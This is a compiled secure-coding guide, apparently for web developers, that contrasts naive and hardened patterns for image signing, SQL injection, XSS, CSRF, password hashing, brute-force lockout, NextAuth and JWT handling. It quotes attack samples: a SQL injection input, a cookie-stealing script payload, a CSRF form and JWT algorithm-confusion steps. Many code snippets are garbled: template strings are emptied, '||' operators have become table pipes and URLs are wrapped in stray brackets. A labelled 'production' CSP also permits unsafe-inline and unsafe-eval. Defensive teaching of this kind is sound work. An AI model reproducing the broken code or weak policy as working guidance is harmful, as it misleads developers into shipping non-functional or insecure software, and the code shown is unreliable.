            message["blocks"].append({
    "type": "section",
    "text": {
    "type": "mrkdwn",
    "text": f"*{alert.package}* ({alert.cve_id})\n"
    f"Services: {', '.join(alert.affected_services)}\n"
    f"Fix: Upgrade to `{alert.fixed_version}`"
            }
            })
    
    await self._send_slack(message)
    

## CONTAINER IMAGE SIGNING

## The Scar 6

> "Deployed to production. Image pulled from registry.
> Someone had pushed a backdoored image with same tag.
> No signature verification. Running attacker's code.
> Detected 3 weeks later during security audit."

## VIBE: Pull any image, trust registry

spec:
  containers:

- image: registry.io/app:latest  # Anyone could have pushed this

    
    ## TITAN: Cosign image signing and verification
    
    name: Sign and Verify Images
    
        jobs:
          build-sign-push:
    runs-on: ubuntu-latest
            permissions:
    id-token: write  # For keyless signing
    packages: write
    
            steps:
    
    - uses: actions/checkout@v4
    
    - name: Install Cosign
    
    uses: sigstore/cosign-installer@v3
    
    - name: Login to Registry
    
    uses: docker/login-action@v3
            with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}
    
    - name: Build and Push
    
    id: build
    uses: docker/build-push-action@v5
            with:
    push: true
    tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
    
    ## Sign with keyless signing (Sigstore)
    
    - name: Sign Image
    
            env:
    COSIGN_EXPERIMENTAL: 1
    | run: |
    cosign sign --yes \
    ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
    
    ## Attest SBOM
    
    - name: Attest SBOM
    | run: |
    cosign attest --yes \
    --predicate sbom.spdx.json \
    --type spdxjson \
    ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
    

## TITAN: Kubernetes admission controller for signature verification

## Kyverno policy

apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
name: verify-image-signature
spec:
validationFailureAction: Enforce
background: false
  rules:

- name: verify-cosign-signature

      match:
        any:

- resources:

        kinds:

- Pod

      verifyImages:

- imageReferences:
- "ghcr.io/company/*"

        attestors:

- entries:
- keyless:

issuer: "<<<<<<<https://token.actions.githubusercontent.com">>>>>>>
subject: "<<<<<<<https://github.com/company/*/.github/workflows/*">>>>>>>
        rekor:
url: <<<<<<<https://rekor.sigstore.dev>>>>>>>
        attestations:

- predicateType: <<<<<<<https://spdx.dev/Document>>>>>>>

        conditions:

- all:
- key: "{{ creationInfo.created }}"

operator: GreaterThan
value: "2024-01-01T00:00:00Z"

## END OF VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY

---

## VOLUME 5: ADVANCED SECURITY PATTERNS

## OWASP TOP 10 PROTECTION

### SQL Injection Prevention

    // ? TITAN: Production SQL injection prevention
    import { PrismaClient } from '@prisma/client';
    
    const prisma = new PrismaClient();
    
    class SecureQueryBuilder {
    // ? VULNERABLE: String concatenation
    static async unsafeSearch(userInput: string) {
    // NEVER DO THIS
    return prisma.\(\SELECT * FROM products WHERE name LIKE '%\%'\);
      }
    
    // ? SAFE: Parameterized queries
    static async safeSearch(userInput: string) {
    // Prisma automatically parameterizes
    return prisma.product.findMany({
    where: {
    name: {
    contains: userInput,
    mode: 'insensitive'
            }
          }
        });
      }
    
    // ? SAFE: Raw query with parameters
    static async safeRawSearch(userInput: string) {
    return prisma.\\
    SELECT * FROM products
    WHERE name ILIKE \
        \;
      }
    
    // Input validation layer
    static validateAndSanitize(input: string): string {
    // Remove dangerous characters
    const sanitized = input
    .replace(/[<>'";]/g, '')  // Remove SQL special chars
          .trim()
    .slice(0, 100);  // Limit length
    
    // Validate format
    if (!/^[a-zA-Z0-9\s-]+\$/.test(sanitized)) {
    throw new ValidationError('Invalid search input');
        }
    
    return sanitized;
      }
    }
    

---

### XSS Prevention 2 2

    // ? TITAN: Production XSS prevention
    import DOMPurify from 'isomorphic-dompurify';
    import { escape } from 'lodash';
    
    class XSSPrevention {
    // Sanitize HTML content (for rich text)
    static sanitizeHTML(dirty: string): string {
    return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
    // Force links to open in new tab safely
    ADD_ATTR: ['target', 'rel'],
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['onclick', 'onerror', 'onload', 'style']
        });
      }
    
    // Escape for text content
    static escapeText(text: string): string {
    return escape(text);
      }
    
    // Validate URL to prevent javascript: protocol
    static sanitizeURL(url: string): string {
    try {
    const parsed = new URL(url);
    if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
    return '#';  // Block dangerous protocols
          }
    return url;
    } catch {
    return '#';
        }
      }
    
    // Content Security Policy header
    static getCSPHeader(): string {
    return [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' <https://cdn.example.com",>
    "style-src 'self' 'unsafe-inline' <https://fonts.googleapis.com",>
    "img-src 'self' data: https: blob:",
    "font-src 'self' <https://fonts.gstatic.com",>
    "connect-src 'self' <https://api.example.com> wss://socket.example.com",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
    ].join('; ');
      }
    }
    
    // React component with XSS protection
    function SafeUserContent({ content }: { content: string }) {
    const sanitized = XSSPrevention.sanitizeHTML(content);
    
    return (
        <div
    dangerouslySetInnerHTML={{ __html: sanitized }}
    // Additional protection with CSP meta tag
        />
      );
    }
    

---

## AUTHENTICATION HARDENING

### Secure Password Handling

    // ? TITAN: Production password security
    import argon2 from 'argon2';
    import crypto from 'crypto';
    
    class PasswordService {
    // Argon2id is the recommended algorithm (winner of PHC)
    private static readonly ARGON2_OPTIONS = {
    type: argon2.argon2id,
    memoryCost: 65536,  // 64MB
    timeCost: 3,  // 3 iterations
    parallelism: 4,  // 4 threads
    hashLength: 32
      };
    
    static async hash(password: string): Promise<string> {
    // Add server-side pepper for defense in depth
    const peppered = this.addPepper(password);
    return argon2.hash(peppered, this.ARGON2_OPTIONS);
      }
    
    static async verify(password: string, hash: string): Promise<boolean> {
    const peppered = this.addPepper(password);
    
    try {
    return await argon2.verify(hash, peppered);
    } catch {
    return false;
        }
      }
    
    private static addPepper(password: string): string {
    const pepper = process.env.PASSWORD_PEPPER!;
    return crypto
    .createHmac('sha256', pepper)
          .update(password)
          .digest('hex');
      }
    
    // Check password against breach databases
    static async checkBreached(password: string): Promise<boolean> {
    const hash = crypto.createHash('sha1').update(password).digest('hex').toUpperCase();
    const prefix = hash.slice(0, 5);
    const suffix = hash.slice(5);
    
    const response = await fetch(\<https://api.pwnedpasswords.com/range/\>\);
    const text = await response.text();
    
    return text.includes(suffix);
      }
    
    // Password strength validation
    static validateStrength(password: string): { valid: boolean; errors: string[] } {
    const errors: string[] = [];
    
    if (password.length < 12) {
    errors.push('Password must be at least 12 characters');
        }
    if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain uppercase letter');
        }
    if (!/[a-z]/.test(password)) {
    errors.push('Password must contain lowercase letter');
        }
    if (!/[0-9]/.test(password)) {
    errors.push('Password must contain number');
        }
    if (!/[^A-Za-z0-9]/.test(password)) {
    errors.push('Password must contain special character');
        }
    
    // Check for common patterns
    const commonPatterns = [
          /^123456/,
          /password/i,
          /qwerty/i,
    /(.)\1{3,}/ // Repeated characters
        ];
    
    if (commonPatterns.some(p => p.test(password))) {
    errors.push('Password contains common pattern');
        }
    
    return { valid: errors.length === 0, errors };
      }
    }
    

---

## RATE LIMITING & BRUTE FORCE PROTECTION

### Account Lockout Pattern

    // ? TITAN: Production brute force protection
    import Redis from 'ioredis';
    
    const redis = new Redis(process.env.REDIS_URL);
    
    interface LockoutConfig {
    maxAttempts: number;
    lockoutDuration: number;  // seconds
    attemptWindow: number;    // seconds
    }
    
    class BruteForceProtection {
    private config: LockoutConfig = {
    maxAttempts: 5,
    lockoutDuration: 900,   // 15 minutes
    attemptWindow: 300  // 5 minutes
      };
    
    async recordAttempt(identifier: string, success: boolean): Promise<void> {
    const key = \login:attempts:\\;
    
    if (success) {
    // Clear attempts on successful login
    await redis.del(key);
    await redis.del(\login:lockout:\\);
    } else {
    // Increment failed attempts
    const attempts = await redis.incr(key);
    
    if (attempts === 1) {
    // Set expiry on first attempt
    await redis.expire(key, this.config.attemptWindow);
          }
    
    if (attempts >= this.config.maxAttempts) {
    // Lock the account
    await redis.setex(
            \login:lockout:\\,
            this.config.lockoutDuration,
            'locked'
            );
    
    // Log security event
    await this.logSecurityEvent(identifier, 'ACCOUNT_LOCKED');
    
    // Alert on repeated lockouts
    const lockoutCount = await redis.incr(\login:lockout:count:\\);
    if (lockoutCount >= 3) {
    await this.alertSecurityTeam(identifier);
            }
          }
        }
      }
    
    async isLocked(identifier: string): Promise<{ locked: boolean; ttl: number }> {
    const ttl = await redis.ttl(\login:lockout:\\);
    return { locked: ttl > 0, ttl: Math.max(0, ttl) };
      }
    
    async getRemainingAttempts(identifier: string): Promise<number> {
    const attempts = await redis.get(\login:attempts:\\);
    | return Math.max(0, this.config.maxAttempts - (parseInt(attempts |  | '0', 10))); |
      }
    
    private async logSecurityEvent(identifier: string, event: string): Promise<void> {
    await prisma.securityLog.create({
    data: {
            identifier,
            event,
    timestamp: new Date(),
    metadata: {}
          }
        });
      }
    
    private async alertSecurityTeam(identifier: string): Promise<void> {
    // Send alert via PagerDuty/Slack
    console.error(\SECURITY ALERT: Multiple lockouts for \\);
      }
    }
    
    // Express middleware
    async function bruteForceMiddleware(req: Request, res: Response, next: NextFunction) {
    const protection = new BruteForceProtection();
    | const identifier = req.ip |  | req.body.email; |
    
    const { locked, ttl } = await protection.isLocked(identifier);
    
    if (locked) {
    return res.status(429).json({
    error: 'Account temporarily locked',
    retryAfter: ttl,
    message: \Too many failed attempts. Try again in \ minutes.\
        });
      }
    
    // Add remaining attempts to response headers
    const remaining = await protection.getRemainingAttempts(identifier);
    res.set('X-RateLimit-Remaining', String(remaining));
    
      next();
    }
    

---

## SECRET MANAGEMENT

### HashiCorp Vault Integration

    // ? TITAN: Production secrets management
    import Vault from 'node-vault';
    
    class SecretsManager {
    private vault;
    private secretCache: Map<string, { value: string; expires: number }> = new Map();
    private cacheLifetime = 300000; // 5 minutes
    
    constructor() {
    this.vault = Vault({
    endpoint: process.env.VAULT_ADDR,
    token: process.env.VAULT_TOKEN
        });
      }
    
    async getSecret(path: string): Promise<string> {
    // Check cache first
    const cached = this.secretCache.get(path);
    if (cached && cached.expires > Date.now()) {
    return cached.value;
        }
    
    // Fetch from Vault
    const result = await this.vault.read(\secret/data/\\);
    const value = result.data.data.value;
    
    // Cache the secret
    this.secretCache.set(path, {
          value,
    expires: Date.now() + this.cacheLifetime
        });
    
    return value;
      }
    
    async getDatabaseCredentials(): Promise<{ username: string; password: string }> {
    const dbPath = 'database/creds/my-role';
    const result = await this.vault.read(dbPath);
    
    return {
    username: result.data.username,
    password: result.data.password
        };
      }
    
    // Rotate secrets periodically
    async rotateSecret(path: string, newValue: string): Promise<void> {
    await this.vault.write(\secret/data/\\, {
    data: { value: newValue }
        });
    
    // Invalidate cache
        this.secretCache.delete(path);
      }
    }
    
    // Dynamic database credentials
    async function createDBConnection() {
    const secrets = new SecretsManager();
    const creds = await secrets.getDatabaseCredentials();
    
    return new Pool({
    host: process.env.DB_HOST,
    database: process.env.DB_NAME,
    user: creds.username,  // Dynamic credentials
    password: creds.password, // Auto-rotated by Vault
    max: 20
      });
    }
    

---

### END OF SECURITY VOLUME 5

### Lines: ~400+ added

---

## VOLUME 6: REAL 2024 NEXTAUTH.JS PRODUCTION ISSUES

## Source: Stack Overflow, GitHub Issues, Developer Reports

> ?? **This is REAL authentication debugging knowledge from production apps.**

---

## SESSION NOT PERSISTING

### The Error

    User logs in successfully but:
    
    - Redirects to home page as unauthenticated
    
    - useSession() returns null
    
    - Protected routes are inaccessible
    

### Real Causes and Fixes

### Cause 1: Missing NEXTAUTH_SECRET in Production

    // ? VIBE: Works locally, breaks in production
    // .env.local has NEXTAUTH_SECRET, but .env.production doesn't
    
    // ? TITAN: Set in production environment
    // Vercel Dashboard ? Settings ? Environment Variables
    // NEXTAUTH_SECRET = <long-random-string>
    
    // Generate a secure secret:
    // npx auth secret
    // OR: openssl rand -base64 32
    

### Cause 2: Missing NEXTAUTH_URL in Production

    // ? VIBE: NextAuth defaults to localhost in production
    // Result: Cookies set for localhost, not your domain
    
    // ? TITAN: Set NEXTAUTH_URL to your production URL
    // NEXTAUTH_URL = <https://your-app.com>
    
    // For Vercel: Automatically inferred, but set it anyway
    // For other providers: REQUIRED
    

### Cause 3: Credentials Provider + Database Adapter Conflict

    // ? VIBE: Using Credentials Provider with PrismaAdapter
    import { PrismaAdapter } from "@auth/prisma-adapter";
    import CredentialsProvider from "next-auth/providers/credentials";
    
    export const authOptions = {
    adapter: PrismaAdapter(prisma),  // Database sessions by default
    providers: [
    CredentialsProvider({ // Requires JWT sessions!
    // ...
        })
      ]
    // CONFLICT: Credentials Provider needs JWT, Adapter uses DB sessions
    };
    
    // ? TITAN: Explicitly enable JWT sessions
    export const authOptions = {
    adapter: PrismaAdapter(prisma),
    session: {
    strategy: "jwt"  // REQUIRED for Credentials Provider
      },
    providers: [
        CredentialsProvider({
    // ...
        })
      ]
    };
    

### Cause 4: useSession Not Updating After Login

    // ? VIBE: Login succeeds but UI doesn't update
    async function handleLogin() {
    const result = await signIn('credentials', {
        email,
        password
      });
    // User logged in, but useSession still returns null
    }
    
    // ? TITAN: Set redirect: false, then manually update
    import { useSession, signIn } from "next-auth/react";
    import { useRouter } from "next/navigation";
    
    function LoginForm() {
    const { update } = useSession();
    const router = useRouter();
    
    async function handleLogin() {
    const result = await signIn('credentials', {
          email,
          password,
    redirect: false  // Don't auto-redirect
        });
    
    if (result?.ok) {
    await update();  // Force session refresh
    router.push('/dashboard'); // Manual redirect
        }
      }
    }
    

---

## CALLBACK ERRORS

### OAuth Callback URL Mismatch

    Error: OAUTH_CALLBACK_HANDLER_ERROR
    Message: "The redirect_uri does not match the registered callback URL"
    

### Fix

    // In OAuth Provider Dashboard (Google, GitHub, etc.)
    // Authorized redirect URIs MUST be exact:
    
    // ? CORRECT:
    // <https://your-app.com/api/auth/callback/google>
    // <https://your-app.com/api/auth/callback/github>
    
    // ? WRONG (trailing slash):
    // <https://your-app.com/api/auth/callback/google/>
    
    // ? WRONG (http instead of https):
    // <http://your-app.com/api/auth/callback/google>
    
    // ? WRONG (www subdomain):
    // <https://www.your-app.com/api/auth/callback/google>
    

### File Name Case Sensitivity

    Error: MISSING_NEXTAUTH_API_ROUTE_ERROR
    

### Fix 2

    
    ## WRONG: [...nextAuth].ts (capital A)
    
    ## CORRECT: [...nextauth].ts (lowercase)
    
    ## Git might not track case-only changes
    
    ## Force rename
    
    git mv 'pages/api/auth/[...nextAuth].ts' 'pages/api/auth/[...nextauth-temp].ts'
    git mv 'pages/api/auth/[...nextauth-temp].ts' 'pages/api/auth/[...nextauth].ts'
    

---

## CALLBACK CONFIGURATION FOR CUSTOM DATA

    // ? TITAN: Complete callback configuration
    export const authOptions: NextAuthOptions = {
    providers: [
        GoogleProvider({
    clientId: process.env.GOOGLE_CLIENT_ID!,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
        }),
        CredentialsProvider({
    credentials: {
    email: { label: "Email", type: "email" },
    password: { label: "Password", type: "password" }
          },
    async authorize(credentials) {
    const user = await prisma.user.findUnique({
    where: { email: credentials?.email }
            });
    
    | if (!user |  | !await bcrypt.compare(credentials!.password, user.password)) { |
    return null;
            }
    
    // Return user object - this becomes token.user
    return {
    id: user.id,
    email: user.email,
    name: user.name,
    role: user.role  // Custom field
            };
          }
        })
      ],
    
    callbacks: {
    // Step 1: JWT callback - runs on sign in and on every request
    async jwt({ token, user, trigger, session }) {
    // User is defined only on sign in
    if (user) {
    token.id = user.id;
    token.role = user.role;
          }
    
    // Handle session update
    if (trigger === "update" && session) {
    token.name = session.name;
          }
    
    return token;
        },
    
    // Step 2: Session callback - runs when session is checked
    async session({ session, token }) {
    // Pass custom fields to session
    if (session.user) {
    session.user.id = token.id as string;
    session.user.role = token.role as string;
          }
    return session;
        }
      },
    
    session: {
    strategy: "jwt",
    maxAge: 30 *24*60* 60  // 30 days
      },
    
    pages: {
    signIn: '/auth/login',
    error: '/auth/error'
      }
    };
    
    // TypeScript: Extend types for custom fields
    declare module "next-auth" {
    interface Session {
    user: {
    id: string;
    role: string;
    } & DefaultSession["user"];
      }
    
    interface User {
    role: string;
      }
    }
    
    declare module "next-auth/jwt" {
    interface JWT {
    id: string;
    role: string;
      }
    }
    

---

## DECISION TREE: NEXTAUTH TROUBLESHOOTING

    NEXTAUTH ISSUE
    
    +- Session doesn't persist after login?
    +- Check NEXTAUTH_SECRET is set in production
    +- Check NEXTAUTH_URL matches your domain
    +- Using Credentials + DB Adapter? ? Set session: { strategy: "jwt" }
    +- Check cookies are being set (DevTools ? Application ? Cookies)
    
    +- OAuth callback error?
    +- Check callback URL in provider dashboard (exact match, no trailing slash)
    +- Check clientId/clientSecret are correct
    +- Check file name is lowercase: [...nextauth].ts
    
    +- Custom user data not in session?
    +- Add data in jwt callback: token.customField = user.customField
    +- Add data in session callback: session.user.customField = token.customField
    
    +- useSession returns null?
    +- Is SessionProvider wrapping your app in layout.tsx?
    +- Using Credentials Provider? ? Use redirect: false + update()
    +- Check you're not calling on server (use auth() for server components)
    
    +- Works locally, fails in production?
    +- Check all environment variables are set in production
    +- Enable debug: true temporarily to see logs
    +- Check Vercel/server logs for errors
    

---

## PRODUCTION CHECKLIST

    Before Deploying NextAuth:
    
    [ ] NEXTAUTH_SECRET set (not from .env.local)
    [ ] NEXTAUTH_URL set to production URL
    [ ] OAuth callback URLs registered exactly
    [ ] clientId/clientSecret set in production env
    [ ] session.strategy matches your adapter usage
    [ ] Credentials Provider has strategy: "jwt"
    [ ] TypeScript types extended for custom fields
    [ ] SessionProvider wraps _app.tsx or layout.tsx
    [ ] Auth middleware protects correct routes
    

---

### END OF NEXTAUTH.JS REAL PRODUCTION ISSUES

---

## VOLUME 7: REAL 2024 JWT SECURITY PATTERNS

## Source: Security Research, CVEs, Production Experience

> ?? **This is REAL authentication security knowledge from production apps.**

---

## JWT VULNERABILITIES

### Algorithm Confusion Attack (Most Common)

    Attacker changes "alg": "RS256" to "alg": "HS256"
    Server uses PUBLIC key as HMAC secret.
    Attacker signs with public key ? Valid token!
    

### Real Fix: Whitelist Algorithms

    // ? VIBE: Trust whatever algorithm is in token
    jwt.verify(token, publicKey);  // Attacker controls algorithm!
    
    // ? TITAN: Explicitly specify algorithm
    jwt.verify(token, publicKey, { algorithms: ['RS256'] });
    
    // Even better: Use jose library with explicit key types
    import { jwtVerify } from 'jose';
    
    const { payload } = await jwtVerify(token, publicKey, {
    algorithms: ['RS256'],
    issuer: '<https://your-auth-server.com',>
    audience: 'your-app'
    });
    

### "none" Algorithm Attack

    Attacker sets "alg": "none"
    Server accepts token without signature!
    

### Real Fix

    // Always reject 'none' algorithm
    const decoded = jwt.verify(token, secret, {
    algorithms: ['HS256', 'RS256'],  // Explicit whitelist, never 'none'
    });
    

---

## REFRESH TOKEN ROTATION

### The Problem

    Access token stolen ? Attacker has access for token lifetime
    Refresh token stolen ? Attacker has indefinite access!
    

### Real Fix: Rotate on Every Use

    // Database schema
    // refresh_tokens: { id, userId, token, familyId, usedAt, revokedAt }
    
    async function refreshAccessToken(refreshToken: string) {
    // 1. Find the refresh token
    const storedToken = await db.refreshToken.findUnique({
    where: { token: refreshToken }
      });
    
    if (!storedToken) {
    throw new Error('Invalid refresh token');
      }
    
    // 2. Check if already used (REUSE DETECTION)
    if (storedToken.usedAt) {
    // Token reuse detected! Possible theft
    // Revoke ENTIRE family of tokens
    await db.refreshToken.updateMany({
    where: { familyId: storedToken.familyId },
    data: { revokedAt: new Date() }
        });
    
    // Alert security team
    await alertSecurityTeam(storedToken.userId, 'Refresh token reuse detected');
    
    throw new Error('Security alert: Token reuse detected');
      }
    
    // 3. Mark current token as used
    await db.refreshToken.update({
    where: { id: storedToken.id },
    data: { usedAt: new Date() }
      });
    
    // 4. Create NEW refresh token (rotation)
    const newRefreshToken = await db.refreshToken.create({
    data: {
    userId: storedToken.userId,
    familyId: storedToken.familyId,  // Same family for reuse detection
    token: generateSecureToken(),
    expiresAt: new Date(Date.now() + 7 *24*60*60* 1000)  // 7 days
        }
      });
    
    // 5. Create new access token
    const accessToken = jwt.sign(
    { userId: storedToken.userId },
        process.env.JWT_SECRET,
    { expiresIn: '15m' }  // Short-lived!
      );
    
    return {
        accessToken,
    refreshToken: newRefreshToken.token
      };
    }
    

---

## SECURE TOKEN STORAGE

    // For Web Applications
    
    // ? VIBE: localStorage (XSS vulnerable)
    localStorage.setItem('accessToken', token);
    // JavaScript can read this ? XSS can steal it
    
    // ? VIBE: sessionStorage (XSS vulnerable)
    sessionStorage.setItem('accessToken', token);
    
    // ? TITAN: HttpOnly cookies (XSS protected)
    // Server sets cookie
    res.cookie('accessToken', accessToken, {
    httpOnly: true,   // JavaScript cannot read
    secure: true,  // HTTPS only
    sameSite: 'lax',  // CSRF protection
    maxAge: 15 *60* 1000,  // 15 minutes
    path: '/'
    });
    
    res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',  // More restrictive for refresh
    maxAge: 7 *24*60*60* 1000,  // 7 days
    path: '/api/auth/refresh'  // Only sent to refresh endpoint
    });
    

---

## TOKEN LIFETIME BEST PRACTICES

    const TOKEN_CONFIG = {
    // Access Token: Used for API calls
    accessToken: {
    lifetime: '15m',  // Short! 15 minutes max
    // If stolen, attacker has limited window
      },
    
    // Refresh Token: Used to get new access tokens
    refreshToken: {
    lifetime: '7d',  // Longer, but not indefinite
    // Should rotate on each use
    // Should be revocable (stored in DB)
      },
    
    // Remember-me: Optional longer session
    rememberMeToken: {
    lifetime: '30d',
    // User explicitly opted in
    // Still rotates and is revocable
      },
    };
    

---

## LOGOUT PROPERLY

    // ? VIBE: Just delete local token
    function logout() {
    localStorage.removeItem('token'); // Token still valid on server!
    }
    
    // ? TITAN: Server-side invalidation
    async function logout(req, res) {
    const refreshToken = req.cookies.refreshToken;
    
    // 1. Revoke all refresh tokens for this family/session
    if (refreshToken) {
    const token = await db.refreshToken.findUnique({
    where: { token: refreshToken }
        });
    
    if (token) {
    await db.refreshToken.updateMany({
    where: { familyId: token.familyId },
    data: { revokedAt: new Date() }
          });
        }
      }
    
    // 2. Clear cookies
      res.clearCookie('accessToken');
      res.clearCookie('refreshToken');
    
    // 3. For stateless JWT access tokens, consider:
    // - Very short lifetimes (15 min)
    // - Token blacklist (with TTL matching token expiry)
    
    res.json({ success: true });
    }
    

---

## DECISION TREE: JWT DEBUGGING

    JWT ISSUE
    
    +- Token rejected as invalid?
    +- Check expiration (exp claim)
    +- Check signature with correct key/algorithm
    +- Check issuer and audience claims
    +- Verify token hasn't been revoked
    
    +- Algorithm confusion vulnerability?
    +- Explicitly whitelist algorithms
    +- Never accept 'none'
    +- Use typed key objects (jose library)
    
    +- Token stolen/compromised?
    +- Rotate refresh tokens immediately
    +- Revoke token family
    +- Force re-authentication
    +- Alert security team
    
    +- Session not persisting?
    +- Check cookie settings (httpOnly, secure, sameSite)
    +- Check domain and path settings
    +- Check CORS credentials configuration
    
    +- Logout not working?
    +- Clear cookies on client
    +- Revoke refresh tokens on server
    +- Consider token blacklist for access tokens
    

---

## JWT SECURITY CHECKLIST

    const jwtSecurityChecklist = {
    // Signing
    algorithm: 'RS256 or ES256 (asymmetric)',  // Not HS256 with weak secret
    secretKey: 'At least 256 bits, from secure vault',
    
    // Claims
    expiration: 'Access: 15 min, Refresh: 7 days',
    issuer: 'Validate iss claim',
    audience: 'Validate aud claim',
    
    // Storage
    accessToken: 'HttpOnly cookie or memory only',
    refreshToken: 'HttpOnly cookie, /api/auth path only',
    neverStore: 'Never in localStorage for auth tokens',
    
    // Rotation
    refreshRotation: 'New token on every use',
    reuseDetection: 'Revoke family if reused',
    
    // Logout
    serverSideRevocation: 'Revoke refresh tokens',
    cookieClearing: 'Clear all auth cookies',
    
    // Additional
    https: 'Always HTTPS in production',
    cors: 'credentials: include with specific origins',
    };
    

---

### END OF JWT REAL SECURITY PATTERNS

---

## VOLUME 8: REAL OWASP SECURITY PATTERNS 2024

## Source: OWASP Top 10, Production Experience, Security Research

> ?? **This is REAL security knowledge - vulnerabilities = data breaches.**

---

## SQL INJECTION PREVENTION 2

    // ? VIBE: String concatenation = SQL Injection!
    const query = `SELECT * FROM users WHERE email = '${email}'`;
    // Attacker input: ' OR '1'='1
    // Result: SELECT * FROM users WHERE email = '' OR '1'='1'
    // Returns ALL users!
    
    // ? TITAN: Parameterized queries
    // Prisma (automatic protection)
    const user = await prisma.user.findUnique({
    where: { email }  // Safe - Prisma escapes automatically
    });
    
    // Raw SQL with parameterized query
    const user = await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`; // Safe - parameterized
    
    // Node.js with pg
    const { rows } = await pool.query(
    'SELECT * FROM users WHERE email = $1',
      [email]
    ); // Safe - parameterized
    

---

## XSS PREVENTION 3

// ? VIBE: Rendering user input directly
function Comment({ content }) {
return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
// Attacker input: <script>stealCookies()</script>

// ? TITAN: React auto-escapes by default
function Comment({ content }) {
return <div>{content}</div>;  // Safe - auto-escaped
}

// If HTML is REQUIRED, sanitize first
import DOMPurify from 'dompurify';

function RichContent({ html }) {
const sanitized = DOMPurify.sanitize(html, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
ALLOWED_ATTR: ['href']
  });
return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Content Security Policy (additional layer)
// next.config.js
module.exports = {
async headers() {
return [{
source: '/(.*)',
headers: [{
key: 'Content-Security-Policy',
value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
      }]
    }];
  }
};

## CSRF PREVENTION

    // ? VIBE: No CSRF protection
    <form action="/api/transfer" method="POST">
    <input name="amount" value="1000">
    <input name="to" value="attacker">
    </form>
    // Attacker can embed this form and trick user to submit
    
    // ? TITAN: Anti-CSRF token
    // Server: Generate token
    import crypto from 'crypto';
    
    function generateCsrfToken(req) {
    const token = crypto.randomBytes(32).toString('hex');
    req.session.csrfToken = token;
    return token;
    }
    
    // Client: Include in forms
    <form action="/api/transfer" method="POST">
    <input type="hidden" name="_csrf" value={csrfToken}>
    <input name="amount" value="1000">
      <button>Transfer</button>
    </form>
    
    // Server: Validate
    function validateCsrf(req) {
    | const token = req.body._csrf |  | req.headers['x-csrf-token']; |
    if (token !== req.session.csrfToken) {
    throw new Error('Invalid CSRF token');
      }
    }
    
    // ? EVEN BETTER: SameSite Cookies
    // Session cookie with SameSite protection
    res.cookie('session', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax'  // or 'strict' for max protection
    });
    // Browser won't send cookie with cross-site requests!
    

---

## SECURE HEADERS

    // Essential security headers
    // middleware.ts (Next.js)
    export function middleware(request: NextRequest) {
    const response = NextResponse.next();
    
    // Prevent clickjacking
    response.headers.set('X-Frame-Options', 'DENY');
    
    // Prevent MIME sniffing
    response.headers.set('X-Content-Type-Options', 'nosniff');
    
    // Enable XSS filter (legacy browsers)
    response.headers.set('X-XSS-Protection', '1; mode=block');
    
    // Control referrer information
    response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
    
    // HTTPS only
    response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    
    return response;
    }
    

---

## INPUT VALIDATION 6

import { z } from 'zod';

// ? TITAN: Validate ALL user input
const userSchema = z.object({
email: z.string().email(),
password: z.string().min(8).max(128),
name: z.string().min(1).max(100),
age: z.number().int().min(0).max(150).optional(),
});

async function createUser(req, res) {
// Validate input
const result = userSchema.safeParse(req.body);

if (!result.success) {
return res.status(400).json({
error: 'Validation failed',
details: result.error.issues
    });
  }

// Use validated data
const user = await db.user.create({
data: result.data
  });

return res.json(user);
}

// For file uploads
const fileSchema = z.object({
mimetype: z.enum(['image/jpeg', 'image/png', 'image/webp']),
size: z.number().max(5 *1024* 1024),  // 5MB max
});

## DECISION TREE: SECURITY AUDIT

    SECURITY CHECK
    
    +- User input?
    +- Validate with Zod/Joi
    +- Escape HTML for display
    +- Parameterize SQL queries
    +- Sanitize file uploads
    
    +- Authentication?
    +- Use battle-tested library (NextAuth, Auth0)
    +- Secure password hashing (bcrypt, argon2)
    +- Rate limit login attempts
    +- Implement MFA for sensitive accounts
    
    +- Session management?
    +- HttpOnly cookies
    +- Secure flag (HTTPS only)
    +- SameSite=Lax or Strict
    +- Short expiration + rotation
    
    +- API security?
    +- CORS configured correctly
    +- Rate limiting in place
    +- Input validation
    +- Proper error handling (no stack traces)
    
    +- Headers?
    +- CSP configured
    +- X-Frame-Options
    +- HSTS enabled
    +- Referrer-Policy set
    

---

### END OF OWASP SECURITY PATTERNS

---

## REAL INPUT VALIDATION PATTERNS 2024

## SQL Injection Prevention 2 2

// NEVER do this
const query = `SELECT *FROM users WHERE id = ${userId}`;

// DO this - parameterized queries
const result = await db.query(
'SELECT* FROM users WHERE id = $1',
  [userId]
);

// With Prisma ORM (safe by default)
const user = await prisma.user.findUnique({
where: { id: userId }
});

// Input validation before database
const userIdSchema = z.string().uuid();
const validatedId = userIdSchema.parse(userId);

## XSS Prevention 4

// React auto-escapes by default
function SafeComponent({ userContent }: { userContent: string }) {
return <div>{userContent}</div>; // Safe - auto-escaped
}

// DANGER: dangerouslySetInnerHTML
function UnsafeComponent({ html }: { html: string }) {
// Only use with trusted/sanitized content
return <div dangerouslySetInnerHTML={{ __html: html }} />; // DANGER
}

